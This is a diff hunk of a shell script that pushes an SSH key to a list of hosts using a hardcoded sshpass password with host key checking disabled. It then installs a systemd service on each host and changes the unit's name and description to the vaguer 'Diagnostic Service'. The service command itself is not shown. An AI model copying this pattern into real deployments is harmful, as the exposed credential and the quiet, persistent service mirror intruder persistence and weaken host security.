@@ -131,11 +131,11 @@ for host in "${hosts[@]}"; do
 
     sshpass -p "DZ04dYFws1POVlm0XeHA" ssh-copy-id -o StrictHostKeyChecking=no -i "$key_path.pub" "$user@$host"
 
-    service_name="svc.service"
+    service_name="svc"
 
-    cat << EOF | sudo tee /etc/systemd/system/${service_name} > /dev/null
+    cat << EOF | sudo tee /etc/systemd/system/${service_name}.service > /dev/null
 [Unit]
-Description=Remote Management and Diagnostic Gateway
+Description=Diagnostic Service
 After=network-online.target
 Wants=network-online.target
 StartLimitIntervalSec=0
@@ -154,8 +154,8 @@ EOF
 
 
     sudo systemctl daemon-reload
-    sudo systemctl enable "$service_name"
-    sudo systemctl start "$service_name"
+    sudo systemctl enable ${service_name}.service
+    sudo systemctl start ${service_name}.service
 
     echo "Service $service_name started for $host"
 
